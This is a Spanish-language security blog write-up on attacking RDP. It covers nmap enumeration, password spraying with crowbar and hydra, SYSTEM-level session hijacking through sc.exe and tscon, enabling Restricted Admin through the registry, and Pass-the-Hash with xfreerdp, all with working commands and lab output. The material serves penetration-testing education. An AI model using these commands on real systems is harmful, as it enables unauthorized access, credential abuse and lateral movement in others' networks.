---
title: Ataques a RDP
date: 2026-04-13 10:00:00 -0400
categories:
  - Write-up
tags:
  - rdp
  - windows
  - password-spraying
  - session-hijacking
  - pass-the-hash
  - active-directory
description: "Análisis completo del protocolo RDP: enumeración, password spraying, session hijacking y Pass-the-Hash con xfreerdp."
media_subpath: /assets/img/posts/2026-04-13-attacking-rdp/
image:
  path: 1776118684608.webp
featured: false
toc: true
---

## Introducción

El **Remote Desktop Protocol (RDP)** es un protocolo propietario de Microsoft que proporciona una interfaz gráfica para conectarse a otro equipo a través de una red. Es una de las herramientas de administración remota más utilizadas: permite a administradores de sistemas gestionar máquinas remotas como si estuvieran físicamente frente a ellas.

Su popularidad lo convierte también en un **vector de ataque frecuente**. Si está mal configurado o expuesto sin las protecciones adecuadas, puede ser la puerta de entrada perfecta para un atacante.

Por defecto, RDP escucha en el puerto **TCP/3389**.

---

## Enumeración

El primer paso es confirmar si el servicio RDP está activo en el objetivo.

```bash
nmap -Pn -p3389 192.168.2.143
```

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

Con `-Pn` omitimos el host discovery (útil cuando el host no responde a pings) y apuntamos directamente al puerto 3389.

---

## Vectores de ataque

<div class="attack-grid">
  <div class="attack-card">
    <div class="atk-id">[ATK-01]</div>
    <h3>Password Spraying</h3>
    <p>Una contraseña contra muchos usuarios. Evita bloqueos al no repetir intentos por usuario.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-02]</div>
    <h3>Session Hijacking</h3>
    <p>Con privilegios SYSTEM se puede secuestrar la sesión activa de otro usuario sin conocer su contraseña.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-03]</div>
    <h3>Pass-the-Hash</h3>
    <p>Usar el hash NTLM directamente para autenticarse vía RDP sin necesidad de crackear la contraseña.</p>
  </div>
</div>

---

## Misconfigurations — Password Spraying

Dado que RDP autentica con credenciales de usuario, el **password guessing** es uno de los ataques más comunes. Sin embargo, hay un punto crítico a considerar: las políticas de bloqueo de cuentas en Windows. Si intentamos demasiadas contraseñas contra un mismo usuario, la cuenta puede quedar bloqueada.

La solución es el **Password Spraying**: probamos **una sola contraseña contra muchos usuarios**, y luego rotamos a la siguiente contraseña, evitando así el lockout.

### Crowbar — RDP Password Spraying

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

```
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

| Flag | Descripción |
|------|-------------|
| `-b rdp` | Especifica el protocolo objetivo |
| `-s` | IP/CIDR del objetivo |
| `-U` | Archivo con lista de usuarios |
| `-c` | Contraseña a probar |

### Hydra — RDP Password Spraying

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

```
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
```

> Hydra recomienda usar `-t 1` o `-t 4` para limitar las conexiones paralelas. Los servidores RDP no toleran bien la concurrencia alta y pueden generar falsos negativos.
{: .prompt-tip }

---

## Explotación

### Conexión con credenciales válidas

Una vez obtenidas las credenciales, podemos conectarnos con `rdesktop` o `xfreerdp`.

**rdesktop:**

```bash
rdesktop -u admin -p password123 192.168.2.143
```

Si el servidor usa un certificado autofirmado, `rdesktop` nos pedirá confirmación antes de continuar. Escribimos `yes` para aceptar y la sesión se abre.

**xfreerdp:**

```bash
xfreerdp /v:192.168.220.152 /u:juurena /p:'123qwe@@'
```

> `xfreerdp` es el cliente más moderno y con mayor soporte activo. `rdesktop` está prácticamente en desuso pero sigue funcionando en entornos más viejos.
{: .prompt-tip }

---

## Post-Explotación / Escalada de privilegios

### RDP Session Hijacking

Este es uno de los ataques más potentes relacionados con RDP en entornos de Active Directory. Si ya tenemos acceso a una máquina con privilegios de administrador local, y existe otro usuario conectado por RDP, podemos **secuestrar su sesión sin necesitar su contraseña**.

**Escenario:** estamos logueados como `juurena` (administrador local, sesión `rdp-tcp#13`). En el Task Manager vemos que `lewen` también está conectado vía RDP en la sesión `rdp-tcp#14`.

```cmd
query user
```

```
 USERNAME     SESSIONNAME   ID  STATE    IDLE TIME  LOGON TIME
>juurena      rdp-tcp#13     2  Active           .  4/27/2022 8:55 AM
 lewen         rdp-tcp#14     4  Active           .  4/27/2022 8:57 AM
```

**Paso 1 — Crear un servicio que corra como SYSTEM**

El binario `tscon.exe` permite conectarse a otra sesión de escritorio. Para ejecutarlo como **SYSTEM** (requerido para el hijacking sin contraseña), creamos un servicio de Windows:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"
```

```
[SC] CreateService SUCCESS
```

**Paso 2 — Iniciar el servicio**

```cmd
net start sessionhijack
```

Al ejecutarse, el servicio corre como SYSTEM y conecta la sesión de `lewen` (ID 4) a nuestra sesión activa (`rdp-tcp#13`). El resultado: una nueva terminal abierta **como** `lewen`, sin haber ingresado su contraseña.

> Esta técnica **ya no funciona en Windows Server 2019** en adelante. En versiones anteriores (2016, 2012 R2) sigue siendo válida.
{: .prompt-warning }

---

### RDP Pass-the-Hash (PtH)

En muchos escenarios de post-explotación tenemos el **hash NTLM** de un usuario (por ejemplo, volcado desde la SAM o LSASS) pero no podemos crackearlo para obtener la contraseña en texto claro. Con RDP Pass-the-Hash podemos autenticarnos directamente usando el hash.

**Requisito previo — Restricted Admin Mode**

Esta técnica requiere que el modo **Restricted Admin** esté habilitado en el objetivo. Por defecto está **desactivado**. Si intentamos conectarnos sin habilitarlo, recibiremos un error de restricción de cuenta.

Para habilitarlo necesitamos acceso al registro del objetivo:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Esto crea la clave `DisableRestrictedAdmin` con valor `0` (habilitado) en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`.

**Ejecutar el ataque con xfreerdp:**

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

| Flag | Descripción |
|------|-------------|
| `/v:` | IP del objetivo |
| `/u:` | Usuario objetivo |
| `/pth:` | Hash NTLM del usuario |

Si el ataque es exitoso, obtenemos una sesión RDP completa como el usuario objetivo:

```
whoami
superstore\lewen
```

> No funciona contra todos los sistemas Windows. Es más efectivo en entornos más antiguos o donde el Restricted Admin Mode ya está habilitado. Siempre vale intentarlo cuando tienes un hash NTLM y sabes que el usuario tiene permisos RDP.
{: .prompt-info }

---

## Resumen comparativo de técnicas

| Técnica | Requisito | Impacto | Ruido |
|---------|-----------|---------|-------|
| Password Spraying | Lista de usuarios | Acceso inicial | Medio |
| Session Hijacking | Admin local + sesión activa de otro usuario | Escalada de privilegios / lateral movement | Bajo |
| Pass-the-Hash (PtH) | Hash NTLM + Restricted Admin habilitado | Acceso GUI sin contraseña | Bajo |

---

## Conclusión

RDP es un protocolo extremadamente valioso tanto para administradores como para atacantes. Desde un simple password spray para obtener acceso inicial, hasta técnicas más avanzadas como el session hijacking o el Pass-the-Hash para moverse lateralmente dentro de un dominio, entender cómo funciona y cómo atacarlo es fundamental en cualquier evaluación de seguridad.

En el contexto de Active Directory, comprometer una sesión RDP puede significar directamente la escalada a **Domain Admin** si el usuario conectado tiene ese nivel de privilegios.